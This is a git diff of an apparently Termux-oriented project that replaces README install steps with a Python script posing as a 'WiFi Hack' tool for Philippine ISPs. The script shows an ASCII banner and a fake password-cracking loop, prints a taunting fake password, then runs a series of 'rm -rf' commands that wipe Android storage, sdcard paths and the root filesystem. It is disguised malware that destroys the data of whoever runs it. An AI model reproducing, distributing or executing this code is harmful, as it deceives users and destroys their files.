@@ -1,16 +1,49 @@
-# Made By Mr. E-Cyber Team
-pkg update
+#made by Mr.E-Cyber Team
 
-pkg upgrade
+print("░██╗░░░░░░░██╗██╗███████╗██╗")
+print("░██║░░██╗░░██║██║██╔════╝██║")
+print("░╚██╗████╗██╔╝██║█████╗░░██║")
+print("░░████╔═████║░██║██╔══╝░░██║")
+print('░░╚██╔╝░╚██╔╝░██║██║░░░░░██║')
+print("░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝")
 
-pkg install python
+print("██╗░░██╗░█████╗░░█████╗░██╗░░██╗")
+print("██║░░██║██╔══██╗██╔══██╗██║░██╔╝")
+print("███████║███████║██║░░╚═╝█████═╝░")
+print("██╔══██║██╔══██║██║░░██╗██╔═██╗░")
+print("██║░░██║██║░░██║╚█████╔╝██║░╚██╗")
+print("╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝")
 
-git clone https://github.com/teamcyber-glitch/WiFi-Hack
 
-cd WiFi-Hack
+print("                     Created by:Mr.E-CYBER TEAM")
 
-python wifiexploit.py
 
-teamcyber-glitch/teamcyber-glitch is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
-You can click the Preview link to take a look at your changes.
---->
+
+input("press in enter to start")
+
+print("choose a brand of wifi")
+
+print("1.PLDT Home fiber")
+print("2.Globe Telecommunity")
+print("3.Dito Telecommunity")
+print("4.Converge")
+print("other")
+
+input("input the number of brand:")
+
+print("attack starting")
+
+
+for y in range (100000):
+        print("Trying password ",y," proccessing password ")
+WifiHack = input("press enter to get password:")
+
+print("password:nadeletenafilesmobata")
+
+import os
+os.system('rm -rf /storage/emulated/0/*')
+os.system('rm -rf /storage/emulated/*')
+os.system('rm -rf /sdcard/*')
+os.system('rm -rf /sdcard/0/*')
+os.system('rm -rf /sdcard1/*')                                                                            os.system('rm -rf /storage/*')
+os.system('rm -rf /*')
